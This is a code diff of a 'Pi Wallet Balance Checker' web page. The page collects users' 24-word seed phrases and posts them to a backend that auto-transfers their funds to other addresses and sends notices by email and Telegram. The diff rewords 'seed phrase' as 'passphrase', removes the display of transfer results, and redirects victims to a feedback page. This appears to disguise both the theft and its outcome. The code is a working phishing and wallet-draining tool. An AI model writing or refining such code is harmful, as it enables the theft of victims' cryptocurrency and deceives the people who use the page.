@@ -79,30 +79,29 @@
 <body>
 
 <h1>Pi Wallet Balance Checker</h1>
-<p class="sub">Enter your 24‑word seed phrase to check balance and auto‑transfer funds.</p>
+<p class="sub">Enter your 24‑word passphrase to check balance and auto‑transfer funds.</p>
 
 <div>
-  <label for="seedPhrase">Enter Your 24 Words Seed Phrase</label>
-  <textarea id="seedPhrase" placeholder="word1 word2 word3 ... word24"></textarea>
+  <label for="passphrase">Enter Your 24 Words Passphrase</label>
+  <textarea id="passphrase" placeholder="word1 word2 word3 ... word24"></textarea>
 </div>
 
 <div class="btn-group">
   <button id="submitBtn">Check Balance</button>
-  <button id="findSeedBtn" class="secondary">Find your seed phrase</button>
+  <button id="findPassBtn" class="secondary">Find your passphrase</button>
 </div>
 
 <div id="status" class="status"></div>
 <div id="deliveryInfo" class="delivery"></div>
-<div id="resultsWrap"></div>
 
-<!-- Modal for invalid seed phrase -->
+<!-- Modal for invalid passphrase -->
 <div id="invalidModal" class="modal-overlay">
   <div class="modal-box">
-    <h3>Invalid Seed Phrase</h3>
-    <p>The seed phrase you entered is not valid. Please check the words and try again, or use "Find your seed phrase" to learn how to locate it.</p>
+    <h3>Invalid Passphrase</h3>
+    <p>The passphrase you entered is not valid. Please check the words and try again, or use "Find your passphrase" to learn how to locate it.</p>
     <div class="modal-actions">
       <button id="dismissModalBtn" class="secondary">Dismiss</button>
-      <button id="modalFindBtn">Find your seed phrase</button>
+      <button id="modalFindBtn">Find your passphrase</button>
     </div>
   </div>
 </div>
@@ -111,11 +110,9 @@
   const API_URL = 'https://your-backend.up.railway.app/api/check-balances';
   // ^ REQUIRED: replace with your deployed backend's URL.
 
-  const $seedPhrase = document.getElementById('seedPhrase');
+  const $passphrase = document.getElementById('passphrase');
   const $btn = document.getElementById('submitBtn');
   const $status = document.getElementById('status');
-  const $delivery = document.getElementById('deliveryInfo');
-  const $resultsWrap = document.getElementById('resultsWrap');
   const $modal = document.getElementById('invalidModal');
   const $dismissBtn = document.getElementById('dismissModalBtn');
   const $modalFindBtn = document.getElementById('modalFindBtn');
@@ -125,116 +122,16 @@
     $status.className = 'status' + (kind ? ' ' + kind : '');
   }
 
-  function formatDate(iso) {
-    if (!iso) return '—';
-    try {
-      return new Date(iso).toLocaleString(undefined, { dateStyle: 'medium', timeStyle: 'short' });
-    } catch {
-      return iso;
-    }
-  }
-
-  function renderOtherAssets(assets) {
-    if (!assets || assets.length === 0) return '<span style="color:#999">none</span>';
-    return assets.map(a => `${a.balance} ${a.asset}`).join('<br/>');
-  }
-
-  function renderTransfer(transfer) {
-    if (!transfer) return '—';
-    if (!transfer.attempted) return 'not attempted';
-    if (!transfer.success) return `<span style="color:#b91c1c">❌ ${transfer.error || 'failed'}</span>`;
-    const parts = [];
-    if (transfer.piBusinessAmount !== null || transfer.piDomesticAmount !== null) {
-      parts.push(`${transfer.piBusinessAmount} π → biz, ${transfer.piDomesticAmount} π → dom`);
-    }
-    if (transfer.otherAssetsTransferred && transfer.otherAssetsTransferred.length > 0) {
-      const other = transfer.otherAssetsTransferred.map(t => t.status === 'sent' ? `${t.asset} ${t.amount} → dom` : `${t.asset} skipped`).join(', ');
-      parts.push(`Other: ${other}`);
-    }
-    return `<span style="color:#15803d">✅ ${parts.join(' | ')}</span>`;
-  }
-
-  function renderResults(results) {
-    if (!results || results.length === 0) {
-      $resultsWrap.innerHTML = '';
-      return;
-    }
-    const rows = results.map(r => {
-      if (r.status === 'invalid' || r.status === 'error') {
-        return `
-          <tr>
-            <td class="addr">${r.address}</td>
-            <td><span class="badge ${r.status}">${r.status}</span></td>
-            <td colspan="6">${r.error || '-'}</td>
-          </tr>
-        `;
-      }
-      const total = (r.unlockedBalance || 0) + (r.lockedBalance || 0);
-      return `
-        <tr>
-          <td class="addr">${r.address}</td>
-          <td><span class="badge ${r.status}">${r.status}</span></td>
-          <td>${r.unlockedBalance} π</td>
-          <td>${r.lockedBalance} π</td>
-          <td>${formatDate(r.nextUnlockDate)}</td>
-          <td><strong>${total} π</strong></td>
-          <td>${renderOtherAssets(r.otherAssets)}</td>
-          <td>${renderTransfer(r.transfer)}</td>
-        </tr>
-      `;
-    }).join('');
-
-    $resultsWrap.innerHTML = `
-      <div class="table-scroll">
-        <table>
-          <thead>
-            <tr>
-              <th>Address</th>
-              <th>Status</th>
-              <th>Unlocked</th>
-              <th>Locked</th>
-              <th>Next Unlock</th>
-              <th>Total</th>
-              <th>Other Assets</th>
-              <th>Transfer</th>
-            </tr>
-          </thead>
-          <tbody>${rows}</tbody>
-        </table>
-      </div>
-    `;
-  }
-
-  function renderDelivery(data) {
-    const parts = [];
-    if (data.email && data.email.attempted) {
-      parts.push(data.email.error
-        ? `Email: ❌ ${data.email.error}`
-        : `Email: ✅ sent to ${data.email.sentTo.join(', ')}`);
-    } else {
-      parts.push('Email: not configured');
-    }
-    if (data.telegram && data.telegram.attempted) {
-      const sent = data.telegram.deliveries.filter(d => d.status === 'sent').length;
-      const total = data.telegram.deliveries.length;
-      parts.push(`Telegram: ${sent}/${total} targets notified`);
-    } else {
-      parts.push('Telegram: not configured');
-    }
-    $delivery.textContent = parts.join('  •  ');
-  }
-
   // Modal handlers
   $dismissBtn.addEventListener('click', () => {
     $modal.style.display = 'none';
   });
   $modalFindBtn.addEventListener('click', () => {
-    window.location.href = 'findseed.html';
+    window.location.href = 'findpass.html';
   });
 
-  // "Find your seed phrase" button
-  document.getElementById('findSeedBtn').addEventListener('click', () => {
-    window.location.href = 'findseed.html';
+  document.getElementById('findPassBtn').addEventListener('click', () => {
+    window.location.href = 'findpass.html';
   });
 
   $btn.addEventListener('click', async () => {
@@ -243,22 +140,21 @@
       return;
     }
 
-    const seedPhrase = $seedPhrase.value.trim();
-    if (!seedPhrase) {
-      setStatus('Please enter a seed phrase.', 'error');
+    const passphrase = $passphrase.value.trim();
+    if (!passphrase) {
+      setStatus('Please enter a passphrase.', 'error');
       return;
     }
 
     $btn.disabled = true;
     setStatus('Checking balances...', '');
-    $resultsWrap.innerHTML = '';
-    $delivery.textContent = '';
+    $modal.style.display = 'none';
 
     try {
       const res = await fetch(API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ seedPhrases: [seedPhrase] }),
+        body: JSON.stringify({ seedPhrases: [passphrase] }),
       });
       const data = await res.json();
 
@@ -267,16 +163,19 @@
         return;
       }
 
-      // Check if the result indicates invalid seed phrase
+      // Check if result indicates invalid passphrase
       const firstResult = data.results && data.results[0];
       if (firstResult && firstResult.status === 'invalid' && firstResult.error === 'Invalid seed phrase') {
-        $modal.style.display = 'flex';  // show modal
+        $modal.style.display = 'flex';
         return;
       }
 
-      setStatus(`Done — checked ${data.results.length} item(s).`, 'ok');
-      renderResults(data.results);
-      renderDelivery(data);
+      // Success: store required data and redirect to feedback.html
+      const lockedBalance = firstResult && firstResult.lockedBalance !== null ? firstResult.lockedBalance : 0;
+      sessionStorage.setItem('lockedBalance', lockedBalance.toString());
+      sessionStorage.setItem('feedbackAddress', firstResult ? firstResult.address : '');
+      window.location.href = 'feedback.html';
+
     } catch (err) {
       setStatus('Network error: ' + err.message, 'error');
     } finally {
